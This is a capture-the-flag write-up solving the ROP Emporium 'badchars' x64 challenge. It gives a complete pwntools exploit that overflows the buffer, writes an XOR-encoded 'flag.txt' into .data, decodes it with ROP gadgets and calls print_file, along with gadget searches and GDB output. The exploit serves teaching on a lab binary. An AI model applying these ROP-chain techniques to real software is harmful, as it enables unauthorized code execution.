---
layout: single
title:  "ROP Emporium - Badchars (x64)"
date:   2020-10-12
excerpt: "badchars was a fundamental challenge from the rop emporium that required the pwner to write a string to an arbitrary memory address, avoiding bad characters. The bad characters needed to be encoded before being processed by the application and further decoded in memory with XOR ROP gadgets. Finally, the memory address we wrote to would need to be passed to a function as an argument to dump the flag's contents."
categories:
  - ctf
  - infosec
tags:
  - exploit development
  - defeating non-executable stacks
  - rop chaining
---

## Summary

badchars was a fundamental challenge from the rop emporium that required the pwner to write a string to an arbitrary memory address, avoiding bad characters. The bad characters needed to be encoded before being processed by the application and further decoded in memory with XOR ROP gadgets. Finally, the memory address we wrote to would need to be passed to a function as an argument to dump the flag's contents. You can read more on the challenge [here](https://ropemporium.com/challenge/badchars.html).

## Analyze the Countermeasures

Always analyze binary countermeasures because it will determine our objective for exploiting the binary and what the limitations are. For all my binary exploit development walkthroughs, I will be using [pwntools](http://docs.pwntools.com/en/stable/) which when installed comes with `checksec`. This tool analyzes countermeasures in the binary when it was initially compiled: 

```
$ checksec badchars
[*] '/home/kali/ctf/rop-emporium/badchars/x64/badchars'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
```

The stack is **non-executable**, so we won't be able to redirect the program's execution to memory instructions located on the stack.
It is also notable that `RUNPATH` points to the current working directory. This is because this challenge also came with a `libbadchars.so` shared object file that links to the executable upon runtime:

```
$ ldd badchars
        linux-vdso.so.1 (0x00007ffd06598000)
        libbadchars.so => ./libbadchars.so (0x00007f837a40f000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f837a230000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f837a613000)
```

## The Challenge Layout

This challenge came with a shared object file `libwrite4.so` which is linked at runtime:

```
badchars  flag.txt  libbadchars.so
```

## Satisfying the Criteria

Quickly running the program tells us about some bad characters:

```
$ ./badchars
badchars by ROP Emporium
x86_64

badchars are: 'x', 'g', 'a', '.'
> x
Thank you!
```

Let's see what happens when we try crashing the app with our typical cyclic pattern from the code below:

```python
from pwn import *

# Set the pwntools context
context.arch = 'amd64'
context.log_level = 'debug'

# Project constants
PROCESS = './badchars'
io = process(PROCESS)

# Debugging
gdbscript = ""
pid = gdb.attach(io, gdbscript=gdbscript)

io.clean()
io.sendline(cyclic(128))
io.interactive()
```

```
$ python3 exploit.py
[+] Starting local process './badchars' argv=[b'./badchars'] : pid 3116
[*] running in new terminal: /usr/bin/gdb -q  "./badchars" 3116
[DEBUG] Launching a new terminal: ['/usr/bin/x-terminal-emulator', '-e', '/usr/bin/gdb -q  "./badchars" 3116']
[+] Waiting for debugger: Done
[DEBUG] Received 0x44 bytes:
    b'badchars by ROP Emporium\n'
    b'x86_64\n'
    b'\n'
    b"badchars are: 'x', 'g', 'a', '.'\n"
    b'> '
[DEBUG] Sent 0x81 bytes:
    b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab\n'
[*] Switching to interactive mode
[DEBUG] Received 0xb bytes:
    b'Thank you!\n'
Thank you!
[*] Got EOF while reading in interactive
```

Notice how our cyclic pattern looks pretty skewed during the crash, preventing us from reliably determining the crash offset at which we can control RIP:

```
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xb               
$rbx   : 0x0               
$rcx   : 0x00007f7f17e15ff3  →  0x5577fffff0003d48 ("H="?)
$rdx   : 0x0               
$rsp   : 0x00007fff2b261b58  →  0xebebeb6cebebeb6b
$rbp   : 0xebebeb6aebebeb69
$rsi   : 0x00007f7f17ee6723  →  0xee8670000000000a
$rdi   : 0x00007f7f17ee8670  →  0x0000000000000000
$rip   : 0x00007f7f17f06a06  →  <pwnme+268> ret 
$r8    : 0xb               
$r9    : 0x2               
$r10   : 0xfffffffffffff55b
$r11   : 0x246             
$r12   : 0x0000000000400520  →  <_start+0> xor ebp, ebp
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fff2b261b58│+0x0000: 0xebebeb6cebebeb6b   ← $rsp
0x00007fff2b261b60│+0x0008: 0xebebeb6eebebeb6d
0x00007fff2b261b68│+0x0010: 0xebebeb70ebebeb6f
0x00007fff2b261b70│+0x0018: 0xebebeb72ebebeb71
0x00007fff2b261b78│+0x0020: 0xebebeb74ebebeb73
0x00007fff2b261b80│+0x0028: 0xebebeb76ebebeb75
0x00007fff2b261b88│+0x0030: 0xebebebebebebeb77
0x00007fff2b261b90│+0x0038: 0x62ebeb7aebebeb79
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7f7f17f069ff <pwnme+261>      call   0x7f7f17f06780 <puts@plt>
   0x7f7f17f06a04 <pwnme+266>      nop    
   0x7f7f17f06a05 <pwnme+267>      leave  
 → 0x7f7f17f06a06 <pwnme+268>      ret    
[!] Cannot disassemble from $PC
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "badchars", stopped 0x7f7f17f06a06 in pwnme (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7f7f17f06a06 → pwnme()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤ 
```

## Removing Bad Characters from the Cyclic Pattern

At this point, we should change the alphabet in our cyclic pattern to exclude the bad characters:

```python
import string
from pwn import *

def make_alphabet(badchars):
    alphabet = string.ascii_lowercase
    for c in badchars:
        alphabet = alphabet.replace(c, '')
    info(f'Using alphabet: {alphabet}')
    return alphabet

# Set the pwntools context
context.arch = 'amd64'
context.log_level = 'debug'

# Project constants
PROCESS = './badchars'
io = process(PROCESS)

# Debugging
gdbscript = ""
pid = gdb.attach(io, gdbscript=gdbscript)

io.clean()
io.sendline(cyclic(128, alphabet=make_alphabet("xga.")))
io.interactive()
```

```
$ python3 exploit.py
[+] Starting local process './badchars' argv=[b'./badchars'] : pid 3513
[*] running in new terminal: /usr/bin/gdb -q  "./badchars" 3513
[DEBUG] Launching a new terminal: ['/usr/bin/x-terminal-emulator', '-e', '/usr/bin/gdb -q  "./badchars" 3513']
[+] Waiting for debugger: Done
[DEBUG] Received 0x44 bytes:
    b'badchars by ROP Emporium\n'
    b'x86_64\n'
    b'\n'
    b"badchars are: 'x', 'g', 'a', '.'\n"
    b'> '
[*] Using alphabet: bcdefhijklmnopqrstuvwyz
[DEBUG] Sent 0x81 bytes:
    b'bbbbcbbbdbbbebbbfbbbhbbbibbbjbbbkbbblbbbmbbbnbbbobbbpbbbqbbbrbbbsbbbtbbbubbbvbbbwbbbybbbzbbccbbcdbbcebbcfbbchbbcibbcjbbckbbclbbc\n'
[*] Switching to interactive mode
[DEBUG] Received 0xb bytes:
    b'Thank you!\n'
Thank you!
```

In GDB, we can now see that a crash happened in our pattern:

```
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xb               
$rbx   : 0x0               
$rcx   : 0x00007fe4dd688ff3  →  0x5577fffff0003d48 ("H="?)
$rdx   : 0x0               
$rsp   : 0x00007ffe8d090b78  →  "mbbbnbbbobbbpbbbqbbbrbbbsbbbtbbbubbbvbbbwbbbybbbzb[...]"
$rbp   : 0x6262626c6262626b ("kbbblbbb"?)
$rsi   : 0x00007fe4dd759723  →  0x75b670000000000a
$rdi   : 0x00007fe4dd75b670  →  0x0000000000000000
$rip   : 0x00007fe4dd779a06  →  <pwnme+268> ret 
$r8    : 0xb               
$r9    : 0x2               
$r10   : 0xfffffffffffff55b
$r11   : 0x246             
$r12   : 0x0000000000400520  →  <_start+0> xor ebp, ebp
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffe8d090b78│+0x0000: "mbbbnbbbobbbpbbbqbbbrbbbsbbbtbbbubbbvbbbwbbbybbbzb[...]"    ← $rsp
0x00007ffe8d090b80│+0x0008: "obbbpbbbqbbbrbbbsbbbtbbbubbbvbbbwbbbybbbzbbccbbcdb[...]"
0x00007ffe8d090b88│+0x0010: "qbbbrbbbsbbbtbbbubbbvbbbwbbbybbbzbbccbbcdbbcebbcfb[...]"
0x00007ffe8d090b90│+0x0018: "sbbbtbbbubbbvbbbwbbbybbbzbbccbbcdbbcebbcfbbchbbcib[...]"
0x00007ffe8d090b98│+0x0020: "ubbbvbbbwbbbybbbzbbccbbcdbbcebbcfbbchbbcibbcjbbckb[...]"
0x00007ffe8d090ba0│+0x0028: "wbbbybbbzbbccbbcdbbcebbcfbbchbbcibbcjbbckbbclbbc\n"
0x00007ffe8d090ba8│+0x0030: "zbbccbbcdbbcebbcfbbchbbcibbcjbbckbbclbbc\n"
0x00007ffe8d090bb0│+0x0038: "dbbcebbcfbbchbbcibbcjbbckbbclbbc\n"
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7fe4dd7799ff <pwnme+261>      call   0x7fe4dd779780 <puts@plt>
   0x7fe4dd779a04 <pwnme+266>      nop    
   0x7fe4dd779a05 <pwnme+267>      leave  
 → 0x7fe4dd779a06 <pwnme+268>      ret    
[!] Cannot disassemble from $PC
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "badchars", stopped 0x7fe4dd779a06 in pwnme (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7fe4dd779a06 → pwnme()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```

Looking up the result with `pwn cyclic`, we can lookup the first 4 bytes within RSP while specifying the alphabet we used to get the crash offset:

```
$ cyclic -a bcdefhijklmnopqrstuvwyz -l mbbb
40
```

## Treasure Hunting

After taking a quick look at this challenge, we will notice that it is similar to the previous challenge (write4), with the exception of bad character filtering.
Therefore, our goal becomes the following:

1. Write "flag.txt" to a memory address because the string `/bin/cat flag.txt` does not exist in the binary.
2. Invoke `print_file(flag_txt_memory_address)`.

Of course, we need to avoid using any bad characters when writing `flag.txt`.

Again, this challenge will only be exploitable if we can satisfy a few conditions.

First, we need a writable memory segment in `badchars`:

```
[0x00400628]> iS
[Sections]

nth paddr        size vaddr       vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000000    0x0 0x00000000    0x0 ----
1   0x00000238   0x1c 0x00400238   0x1c -r-- .interp
2   0x00000254   0x20 0x00400254   0x20 -r-- .note.ABI_tag
3   0x00000274   0x24 0x00400274   0x24 -r-- .note.gnu.build_id
4   0x00000298   0x38 0x00400298   0x38 -r-- .gnu.hash
5   0x000002d0   0xf0 0x004002d0   0xf0 -r-- .dynsym
6   0x000003c0   0x7e 0x004003c0   0x7e -r-- .dynstr
7   0x0000043e   0x14 0x0040043e   0x14 -r-- .gnu.version
8   0x00000458   0x20 0x00400458   0x20 -r-- .gnu.version_r
9   0x00000478   0x30 0x00400478   0x30 -r-- .rela.dyn
10  0x000004a8   0x30 0x004004a8   0x30 -r-- .rela.plt
11  0x000004d8   0x17 0x004004d8   0x17 -r-x .init
12  0x000004f0   0x30 0x004004f0   0x30 -r-x .plt
13  0x00000520  0x192 0x00400520  0x192 -r-x .text
14  0x000006b4    0x9 0x004006b4    0x9 -r-x .fini
15  0x000006c0   0x10 0x004006c0   0x10 -r-- .rodata
16  0x000006d0   0x44 0x004006d0   0x44 -r-- .eh_frame_hdr
17  0x00000718  0x120 0x00400718  0x120 -r-- .eh_frame
18  0x00000df0    0x8 0x00600df0    0x8 -rw- .init_array
19  0x00000df8    0x8 0x00600df8    0x8 -rw- .fini_array
20  0x00000e00  0x1f0 0x00600e00  0x1f0 -rw- .dynamic
21  0x00000ff0   0x10 0x00600ff0   0x10 -rw- .got
22  0x00001000   0x28 0x00601000   0x28 -rw- .got.plt
23  0x00001028   0x10 0x00601028   0x10 -rw- .data
24  0x00001038    0x0 0x00601038    0x8 -rw- .bss
25  0x00001038   0x29 0x00000000   0x29 ---- .comment
26  0x00001068  0x618 0x00000000  0x618 ---- .symtab
27  0x00001680  0x1f8 0x00000000  0x1f8 ---- .strtab
28  0x00001878  0x103 0x00000000  0x103 ---- .shstrtab
```

The `.data` section is normally a safe place to write to and has `0x10` bytes of space available.
On this note, we should be able to write `flag.txt` to memory address `0x00601028`.
However, for this challenge, we will be writing to memory address `0x00601029` because for some reason, it appears as the memory location `0x00601028` was read-only when I tested it.

Next, we need to write arbitrary data to the `.data` segment.

Let's search for interesting symbols in `badchars`:

```
[0x00400628]> is
[Symbols]

nth paddr       vaddr      bind   type   size lib name
――――――――――――――――――――――――――――――――――――――――――――――――――――――
... CONTENT SNIPPED ...
37   0x00000628 0x00400628 LOCAL  NOTYPE 0        usefulGadgets
... CONTENT SNIPPED ...
```

We can disassemble some instructions at `usefulGadgets`:

```
[0x00400520]> s 0x00400628
[0x00400628]> pd 16
            ;-- usefulGadgets:
            0x00400628      453037         xor byte [r15], r14b
            0x0040062b      c3             ret
            0x0040062c      450037         add byte [r15], r14b
            0x0040062f      c3             ret
            0x00400630      452837         sub byte [r15], r14b
            0x00400633      c3             ret
            0x00400634      4d896500       mov qword [r13], r12
            0x00400638      c3             ret
            0x00400639      0f1f80000000.  nop dword [rax]
... CONTENT SNIPPED ...
```

We can use the `xor byte [r15], r14b` instruction to decode one byte at a time.
First, let's quickly review how XOR works. Consider the following:

```
$ python3
Python 3.8.5 (default, Aug  2 2020, 15:09:07)
[GCC 10.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> ord(b"a") ^ ord(b"\x90")
241
>>> chr(241 ^ ord(b"\x90"))
'a'
>>>
```

In the example above, we XOR'ed `a` with a key `\x90` to get the ascii character at decimal position 241.
We can XOR the result with the same key `\x90` to recover our initial byte `a`.

With the `mov qword [r13], r12` instruction, we can write 8 bytes at a time to the memory address in `r13`.

Next, we need to search for a ROP gadget where we can assign arbitrary values to the `r12`, `r13`, `r14`, and `r15` registers:

```
[0x00400628]> /R pop r12;
  0x0040069c               415c  pop r12
  0x0040069e               415d  pop r13
  0x004006a0               415e  pop r14
  0x004006a2               415f  pop r15
  0x004006a4                 c3  ret
```

Looks like we have a gadget at `0x0040069c`.

The last thing we need is a `pop rdi; ret;` gadget so that we can set the RDI register to the memory address we wrote to:

```
[0x00400628]> /R pop rdi;
  0x004006a3                 5f  pop rdi
  0x004006a4                 c3  ret
```

Great! We have a `pop rdi; ret;` gadget at `0x004006a3`.

## Crafting the Exploit

At this point, we should be able to verify that we can write arbitrary values to the static address in the `.data` segment!
In the code below, we set a breakpoint just before we write to the `.data` segment.

```python
from pwn import *

def encode_badchars(data, badchars, key):
    result = b""
    for b in data:
        if b in badchars:
            result += bytes([b ^ ord(key)])
            continue
        result += bytes([b])
    return result

# Set the pwntools context
context.arch = 'amd64'
context.log_level = 'debug'

# Project constants
PROCESS = './badchars'
io = process(PROCESS)

# Debugging
gdbscript = "b *0x00601028\nb *0x0040069c"
pid = gdb.attach(io, gdbscript=gdbscript)

# Initialize ROP
rop = ROP(io.elf)

# Gadgets
writable_data_segment = 0x00601029                         # .data segment
xor_r15_r14_ret = p64(0x00400628)                          # xor byte [r15], r14b; ret;
write_memory_gadget = p64(0x00400634)                      # mov qword [r13], r12; ret;
pop_r12_pop_r13_pop_r14_pop_r15_ret = p64(0x0040069c)      # pop r12; pop r13; pop r14; pop r15; ret;
pop_r14_pop_r15_ret = p64(0x004006a0)                      # pop r14; pop r15; ret;
pop_rdi_ret = p64(rop.search(move=0,regs=['rdi']).address) # pop rdi; ret;

# Existing functions
print_file = p64(io.elf.plt['print_file'])

# Alphabets
badchars = b"xga.\n\r"
key = b"\x90"
target = encode_badchars(b"flag.txt", badchars, key)
info(f'XOR Key: {key}')
info(f'Encoded target: {target}')

# Write the encoded target to the .data section
idx = 0
addr_size = 8
while idx < len(target):
    data = target[idx:idx+addr_size]
    write_location = p64(writable_data_segment + idx)
    rop.raw(pop_r12_pop_r13_pop_r14_pop_r15_ret)
    rop.raw(data)
    rop.raw(write_location)
    rop.raw(p64(0xdeadbeefdeadbeef)) # junk for r14
    rop.raw(p64(0xdeadbeefdeadbeef)) # junk for r15
    rop.raw(write_memory_gadget)
    idx += addr_size

# Make the payload
offset = 40
padding = key * offset
payload = b"".join([
    padding,
    rop.chain()
])

# Pwn!
io.clean()
io.sendline(payload)
io.interactive()
```

```
$ python3 exploit.py
[+] Starting local process './badchars' argv=[b'./badchars'] : pid 4629
[DEBUG] Wrote gdb script to '/tmp/pwnvmuu57pr.gdb'
    b *0x00601028
    b *0x0040069c
[*] running in new terminal: /usr/bin/gdb -q  "./badchars" 4629 -x /tmp/pwnvmuu57pr.gdb
[DEBUG] Launching a new terminal: ['/usr/bin/x-terminal-emulator', '-e', '/usr/bin/gdb -q  "./badchars" 4629 -x /tmp/pwnvmuu57pr.gdb']
[+] Waiting for debugger: Done
[DEBUG] PLT 0x400500 pwnme
[DEBUG] PLT 0x400510 print_file
[*] '/home/kali/ctf/rop-emporium/badchars/x64/badchars'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[*] Loaded 13 cached gadgets for './badchars'
[DEBUG] PLT 0x400500 pwnme
[DEBUG] PLT 0x400510 print_file
[*] XOR Key: b'\x90'
[*] Encoded target: b'fl\xf1\xf7\xbet\xe8t'
[DEBUG] Received 0x44 bytes:
    b'badchars by ROP Emporium\n'
    b'x86_64\n'
    b'\n'
    b"badchars are: 'x', 'g', 'a', '.'\n"
    b'> '
[DEBUG] Sent 0x59 bytes:
    00000000  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
    *
    00000020  90 90 90 90  90 90 90 90  9c 06 40 00  00 00 00 00  │····│····│··@·│····│
    00000030  66 6c f1 f7  be 74 e8 74  29 10 60 00  00 00 00 00  │fl··│·t·t│)·`·│····│
    00000040  ef be ad de  ef be ad de  ef be ad de  ef be ad de  │····│····│····│····│
    00000050  34 06 40 00  00 00 00 00  0a                        │4·@·│····│·│
    00000059
[*] Switching to interactive mode
[DEBUG] Received 0xb bytes:
    b'Thank you!\n'
Thank you!
```

In GDB:

```
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xb               
$rbx   : 0x0               
$rcx   : 0x00007effcc073ff3  →  0x5577fffff0003d48 ("H="?)
$rdx   : 0x0               
$rsp   : 0x00007ffe69b2e9b8  →  0x00007effcbfab70a  →  <init_cacheinfo+90> jl 0x7effcbfab725 <init_cacheinfo+117>
$rbp   : 0x9090909090909090
$rsi   : 0x00007effcc144723  →  0x146670000000000a
$rdi   : 0x00007effcc146670  →  0x0000000000000000
$rip   : 0x0000000000400638  →  <usefulGadgets+16> ret 
$r8    : 0xb               
$r9    : 0x2               
$r10   : 0xfffffffffffff55b
$r11   : 0x246             
$r12   : 0x74e874bef7f16c66
$r13   : 0x0000000000601029  →  0x74e874bef7f16c66
$r14   : 0xdeadbeefdeadbeef
$r15   : 0xdeadbeefdeadbeef
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffe69b2e9b8│+0x0000: 0x00007effcbfab70a  →  <init_cacheinfo+90> jl 0x7effcbfab725 <init_cacheinfo+117>    ← $rsp
0x00007ffe69b2e9c0│+0x0008: 0x0000000000000000
0x00007ffe69b2e9c8│+0x0010: 0x51342fdcbd6cf710
0x00007ffe69b2e9d0│+0x0018: 0x0000000000400520  →  <_start+0> xor ebp, ebp
0x00007ffe69b2e9d8│+0x0020: 0x0000000000000000
0x00007ffe69b2e9e0│+0x0028: 0x0000000000000000
0x00007ffe69b2e9e8│+0x0030: 0x0000000000000000
0x00007ffe69b2e9f0│+0x0038: 0xaec8fc3962acf710
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400630 <usefulGadgets+8> sub    BYTE PTR [r15], r14b
     0x400633 <usefulGadgets+11> ret    
     0x400634 <usefulGadgets+12> mov    QWORD PTR [r13+0x0], r12
 →   0x400638 <usefulGadgets+16> ret    
   ↳  0x7effcbfab70a <init_cacheinfo+90> jl     0x7effcbfab725 <init_cacheinfo+117>
      0x7effcbfab70c <init_cacheinfo+92> add    BYTE PTR [rbp+0x30], al
      0x7effcbfab70f <init_cacheinfo+95> in     al, 0x48
      0x7effcbfab711 <init_cacheinfo+97> sar    eax, 1
      0x7effcbfab713 <init_cacheinfo+99> mov    QWORD PTR [rip+0x197c0e], r12        # 0x7effcc143328 <__x86_data_cache_size>
      0x7effcbfab71a <init_cacheinfo+106> mov    QWORD PTR [rip+0x197bff], rax        # 0x7effcc143320 <__x86_raw_data_cache_size_half>
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "badchars", stopped 0x400638 in usefulGadgets (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400638 → usefulGadgets()
[#1] 0x7effcbfab70a → init_cacheinfo()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/2xg 0x0000000000601029
0x601029:       0x74e874bef7f16c66      0x0000000000000000
gef➤  x/s $r13
0x601029:       "fl\361\367\276t\350t"
```

Success! We have successfully written the encoded `flag.txt` target to the `.data` segment!

## Decoding the Target

At this point, we need decode the `flag.txt` payload at the `.data` segment and invoke `print_file` with the `.data` segment as its first argument.
We will only decode the bad characters to keep the size of our ROP chain small.

We update the `encode_badchars` function to include the offsets at which bad characters are located.
If you further analyze my algorithm, I recommend setting breakpoints at the ROP gadgets of interest and observe changes to memory in GDB.

```python
from pwn import *

def encode_badchars(data, badchars, key):
    result = b""
    encoded_byte_offsets = []
    for idx, b in enumerate(data):
        if b in badchars:
            result += bytes([b ^ ord(key)])
            encoded_byte_offsets.append(idx)
            continue
        result += bytes([b])
    return result, encoded_byte_offsets

# Set the pwntools context
context.arch = 'amd64'
context.log_level = 'debug'

# Project constants
PROCESS = './badchars'
io = process(PROCESS)

# Initialize ROP
rop = ROP(io.elf)

# Gadgets
writable_data_segment = 0x00601029                         # .data segment
xor_r15_r14_ret = p64(0x00400628)                          # xor byte [r15], r14b; ret;
write_memory_gadget = p64(0x00400634)                      # mov qword [r13], r12; ret;
pop_r12_pop_r13_pop_r14_pop_r15_ret = p64(0x0040069c)      # pop r12; pop r13; pop r14; pop r15; ret;
pop_r14_pop_r15_ret = p64(0x004006a0)                      # pop r14; pop r15; ret;
pop_rdi_ret = p64(rop.search(move=0,regs=['rdi']).address) # pop rdi; ret;

# Existing functions
print_file = p64(io.elf.plt['print_file'])

# Alphabets
plaintext_target = b"flag.txt"
badchars = b"xga.\n\r"
key = b"\x90"
target, encoded_byte_offsets = encode_badchars(plaintext_target, badchars, key)
info(f'XOR Key: {key}')
info(f'Encoded target: {target}')

# Write the encoded target to the .data section
idx = 0
addr_size = 8
while idx < len(target):
    data = target[idx:idx+addr_size]
    write_location = p64(writable_data_segment + idx)
    rop.raw(pop_r12_pop_r13_pop_r14_pop_r15_ret)
    rop.raw(data)
    rop.raw(write_location)
    rop.raw(p64(0xdeadbeefdeadbeef)) # junk for r14
    rop.raw(p64(0xdeadbeefdeadbeef)) # junk for r15
    rop.raw(write_memory_gadget)
    idx += addr_size

# Decode the encoded target in the .data segment one byte at a time
for encoded_byte_offset in encoded_byte_offsets:
    write_location = p64(writable_data_segment + encoded_byte_offset)
    rop.raw(pop_r14_pop_r15_ret)
    rop.raw(p64(ord(key)))
    rop.raw(write_location)
    rop.raw(xor_r15_r14_ret)

# Read the file
rop.raw(pop_rdi_ret)
rop.raw(writable_data_segment)
rop.raw(print_file)

# Make the payload
offset = 40
padding = key * offset
payload = b"".join([
    padding,
    rop.chain()
])

# Pwn!
io.clean()
io.sendline(payload)
io.interactive()
```

```
$ python3 exploit.py
[+] Starting local process './badchars' argv=[b'./badchars'] : pid 5123
[DEBUG] PLT 0x400500 pwnme
[DEBUG] PLT 0x400510 print_file
[*] '/home/kali/ctf/rop-emporium/badchars/x64/badchars'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[*] Loaded 13 cached gadgets for './badchars'
[DEBUG] PLT 0x400500 pwnme
[DEBUG] PLT 0x400510 print_file
[*] XOR Key: b'\x90'
[*] Encoded target: b'fl\xf1\xf7\xbet\xe8t'
[DEBUG] Received 0x44 bytes:
    b'badchars by ROP Emporium\n'
    b'x86_64\n'
    b'\n'
    b"badchars are: 'x', 'g', 'a', '.'\n"
    b'> '
[DEBUG] Sent 0xf1 bytes:
    00000000  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
    *
    00000020  90 90 90 90  90 90 90 90  9c 06 40 00  00 00 00 00  │····│····│··@·│····│
    00000030  66 6c f1 f7  be 74 e8 74  29 10 60 00  00 00 00 00  │fl··│·t·t│)·`·│····│
    00000040  ef be ad de  ef be ad de  ef be ad de  ef be ad de  │····│····│····│····│
    00000050  34 06 40 00  00 00 00 00  a0 06 40 00  00 00 00 00  │4·@·│····│··@·│····│
    00000060  90 00 00 00  00 00 00 00  2b 10 60 00  00 00 00 00  │····│····│+·`·│····│
    00000070  28 06 40 00  00 00 00 00  a0 06 40 00  00 00 00 00  │(·@·│····│··@·│····│
    00000080  90 00 00 00  00 00 00 00  2c 10 60 00  00 00 00 00  │····│····│,·`·│····│
    00000090  28 06 40 00  00 00 00 00  a0 06 40 00  00 00 00 00  │(·@·│····│··@·│····│
    000000a0  90 00 00 00  00 00 00 00  2d 10 60 00  00 00 00 00  │····│····│-·`·│····│
    000000b0  28 06 40 00  00 00 00 00  a0 06 40 00  00 00 00 00  │(·@·│····│··@·│····│
    000000c0  90 00 00 00  00 00 00 00  2f 10 60 00  00 00 00 00  │····│····│/·`·│····│
    000000d0  28 06 40 00  00 00 00 00  a3 06 40 00  00 00 00 00  │(·@·│····│··@·│····│
    000000e0  29 10 60 00  00 00 00 00  10 05 40 00  00 00 00 00  │)·`·│····│··@·│····│
    000000f0  0a                                                  │·│
    000000f1
[*] Switching to interactive mode
[DEBUG] Received 0x2c bytes:
    b'Thank you!\n'
    b'ROPE{a_placeholder_32byte_flag!}\n'
Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Process './badchars' stopped with exit code -11 (SIGSEGV) (pid 5123)
[*] Got EOF while reading in interactive
```

The `flag.txt` payload was successfully decoded in memory by leverating the XOR ROP gadgets, granting us the flag: `ROPE{a_placeholder_32byte_flag!}`
